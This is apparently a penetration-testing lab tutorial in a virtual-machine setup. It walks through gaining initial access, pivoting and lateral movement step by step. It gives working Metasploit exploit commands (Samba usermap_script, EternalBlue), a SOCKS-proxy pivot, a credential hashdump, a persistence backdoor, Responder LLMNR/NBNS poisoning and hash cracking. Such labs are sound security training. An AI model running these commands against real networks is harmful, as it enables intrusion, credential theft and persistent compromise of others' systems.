Pivoting and Internal Network Exploitation

Pivoting and Internal Network Exploitation [project: after gaining initial access to a network, use pivoting techniques to exploit other internal systems. This simulates lateral movement within a compromised network; Tools and Software- Metasploit(for exploiting vulnerabilities and pivoting), Proxy Chains(for routing traffic through compromised machines), Responder(for Man in the Middle attacks)]

Uses:
This project simulates lateral movement within a compromised network after gaining initial access. The focus is on pivoting, exploiting internal systems, and leveraging tools like Metasploit, ProxyChains, and Responder.

Step 1: Set Up the Lab Environment
Create a Virtual Network:
Use VirtualBox or VMware to set up multiple VMs (e.g., Kali Linux as the attacker, a vulnerable server like Metasploitable2, and a client machine running Windows or Linux).Configure all VMs in an internal network to simulate a real environment.

Install Required Tools:
•	Kali Linux (comes pre-installed with Metasploit, ProxyChains, and Responder).
•	Vulnerable VMs like Metasploitable2, Windows Server 2012, or custom vulnerable systems.

Verify Connectivity:
Ensure all VMs can communicate within the internal network.

Step 2: Gain Initial Access
Using Metasploit, Discover Vulnerabilities:
Scan the network with Nmap: nmap -sV -p- <target_IP>
Identify exploitable services like SMB, FTP, or outdated software.

Using Metasploit, Exploit Vulnerabilities:
Launch Metasploit: msfconsole
Search for exploits: search exploit <service>
Use an exploit: use exploit/multi/samba/usermap_script
set RHOST <target_IP>
exploit


Step 3: Enumerate the Internal Network
Discover Internal Systems:
Use the compromised machine to scan the internal network:
ifconfig
route
nmap -sn <internal_network_range>

List Open Ports and Services:
From the compromised machine: nmap -sV <internal_target_IP>

Step 4: Pivoting
Set Up Pivoting with Metasploit:
Set Up a Route:
Add a route to the internal network:
route add <internal_network_range> <session_ID>

Proxy Traffic Through the Compromised Host:
•	Enable SOCKS proxy: 	use auxiliary/server/socks4a
set SRVPORT 1080
run
•	Configure ProxyChains: Edit the ProxyChains configuration file: nano /etc/proxychains.conf
Add the following at the bottom: socks4 127.0.0.1 1080

•	Run Tools Through ProxyChains: Scan the internal network through the compromised host:
proxychains nmap -sV <internal_target_IP>

Step 5: Exploit Internal Systems
Identify Vulnerabilities:
Use Nmap and Metasploit to identify vulnerabilities on internal systems.
For example, exploit SMB:
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <internal_target_IP>
exploit

Obtain Sensitive Information:
Dump credentials:
use post/windows/gather/hashdump
set SESSION <session_ID>
run
Maintain Persistence:

Create a backdoor:
use exploit/windows/local/persistence
set SESSION <session_ID>
run

Step 6: Perform MITM Attacks
Using Responder:
Start Responder: Run Responder on the compromised machine or another VM to capture credentials:
responder -I <network_interface>

Force Authentication:
Trick internal systems to authenticate to Responder using LLMNR or NBNS poisoning.

Analyze Captured Hashes:
Use John the Ripper or Hashcat to crack hashes:
john --wordlist=/usr/share/wordlists/rockyou.txt <captured_hash_file>


